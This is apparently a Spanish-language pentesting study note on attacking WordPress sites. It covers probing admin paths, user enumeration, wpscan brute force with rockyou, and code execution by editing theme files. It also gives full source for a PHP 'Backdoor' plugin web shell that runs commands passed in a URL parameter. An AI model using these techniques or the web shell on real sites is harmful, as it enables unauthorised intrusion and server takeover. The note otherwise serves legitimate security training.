## WordPress como objetivo

**WordPress** es un CMS (Gestor de Contenidos) escrito en **PHP**. Es el CMS más usado del mundo, por lo que es un objetivo muy frecuente en pentesting. Su gran cantidad de **plugins y themes** amplía la superficie de ataque: cada uno puede tener vulnerabilidades.

### Rutas típicas que debes probar

| Ruta          | Descripción                                              |
| ------------- | -------------------------------------------------------- |
| `/wp-admin/`  | Panel de administración (aunque a veces el archivo es el de abajo) |
| `wp-login.php`| Página de autenticación                                  |
| `xmlrpc.php`  | Permite hacer **fuerza bruta** si está habilitado         |
| `wp-content/` | Carpeta donde viven themes y plugins                     |
| `readme.html` | Revela a veces la versión                                |

### Identificar la versión

En el **código fuente** (`Ctrl+U`), la etiqueta `<meta name="generator">` muestra la versión de WordPress:

```html
<meta name="generator" content="WordPress 6.2" />
```

También puedes enumerar el autor/usuario vía el error de `wp-login.php`: el mensaje cambia si el usuario existe ("La contraseña que has introducido para el usuario X es incorrecta") o no.

### Acceso al servidor desde el panel interno de WordPress

Si consigues credenciales de administrador, puedes llegar a **ejecutar código** en el servidor. La vía más común es editar el **theme**:

1. Ve a **Apariencia > Editor de archivos del tema**.
   ![[Pasted image 20260706232503.png|697]]
2. Si no apareciera, usa **Plugins > Añadir nuevo > Subir plugin** de forma manual.
   ![[Pasted image 20260706232608.png]]
3. Otra opción es añadir un plugin nuevo (requiere acceso a Internet) y buscar "**theme editor**".
   ![[Pasted image 20260706232655.png]]
4. Una vez en el editor, edita un archivo PHP (p. ej. `header.php` o `404.php`) e inyecta código malicioso (una reverse shell).
   ![[Pasted image 20260706232751.png]]
5. Pulsa **Update file** y en el navegador visita la ruta real del archivo (dibujada en la captura de abajo) para que se ejecute:
   ![[Pasted image 20260706232901.png|697]]
   > La ruta concreta depende de qué archivo edites y del theme activo.

### Enumeración de plugins

Para enumerar usuarios y plugins con **wpscan**:

```bash
wpscan --url http://IP --enumerate u,p
```

- `-e u` / `--enumerate u` → enumera **usuarios**.
- `-e p` / `--enumerate p` → enumera **plugins**.

![[Pasted image 20260706233045.png]]

Una vez enumerados los usuarios puedes probar **fuerza bruta**:

```bash
wpscan --url http://IP --usernames admin --passwords /usr/share/wordlists/rockyou.txt
```

![[Pasted image 20260706233419.png]]

También se pueden buscar usuarios por la ruta por autor:

```
http://IP/?author=1
http://IP/author/admin/
```

![[Pasted image 20260706233324.png|691]]

### Enumerar y explotar vulnerabilidades de plugins

1. Detecta el plugin y su **versión** (con wpscan o manualmente).
2. Busca una **PoC** (Proof of Concept) para esa versión.
3. Descárgala y ejecútala.

![[Pasted image 20260706233928.png]]

Si da un error de incompatibilidad, ejecuta el comando alternativo:

![[Pasted image 20260706233944.png]]

Y si ese falla, usa el siguiente:

![[Pasted image 20260706234001.png]]

### Creación de un plugin malicioso

Si no hay un plugin vulnerable, podemos **crear uno malicioso** nosotros:

1. Obtén usuario y contraseña del login de WordPress y accede.
2. Comprueba si hay algún plugin malicioso ya subido; si no, créalo.

> Los plugins se escriben en **PHP**, porque WordPress funciona con PHP.

Código de ejemplo (una reverse shell simple como plugin):

```php
<?php
/*
Plugin Name: Backdoor
*/
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

> En el apunte de [Aplicaciones](../Utilidades/Aplicaciones.md) tienes más sobre inyectar reverse shells.

3. Comprime el plugin en un `.zip`.
4. Ve a **Plugins > Añadir nuevo > Subir plugin**, súbelo, **instálalo** y **actívalo**.